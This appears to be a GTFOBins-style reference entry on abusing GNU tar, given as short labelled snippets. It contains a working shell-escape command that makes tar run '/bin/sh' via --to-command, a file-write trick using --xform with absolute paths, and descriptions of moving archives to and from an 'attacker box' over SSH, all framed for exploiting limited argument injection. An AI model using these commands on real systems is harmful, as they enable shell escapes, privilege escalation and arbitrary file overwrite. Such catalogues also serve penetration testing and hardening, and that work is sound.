shell.description: This only works for GNU tar.
This only works for GNU tar. It can be useful when only a limited command argument injection is available.
shell.code:
TF=$(mktemp)
echo '/bin/sh 0<&1' > "$TF"
tar cf "$TF.tar" "$TF"
tar xf "$TF.tar" --to-command sh
rm "$TF"*

file-upload.description: This only works for GNU tar. Create tar archive and send it via SSH to a remote location. The attacker box must have the 'rmt' utility installed (it should be present by default in Debian-like distributions).

file-download.description: This only works for GNU tar. Download and extract a tar archive via SSH. The attacker box must have the 'rmt' utility installed (it should be present by default in Debian-like distributions).

file-write.description: This only works for GNU tar.
file-write.code:
TF=$(mktemp)
echo DATA > "$TF"
tar c --xform "s@.*@[file]@" -OP "$TF" | tar x -P

file-read.description: This only works for GNU tar.
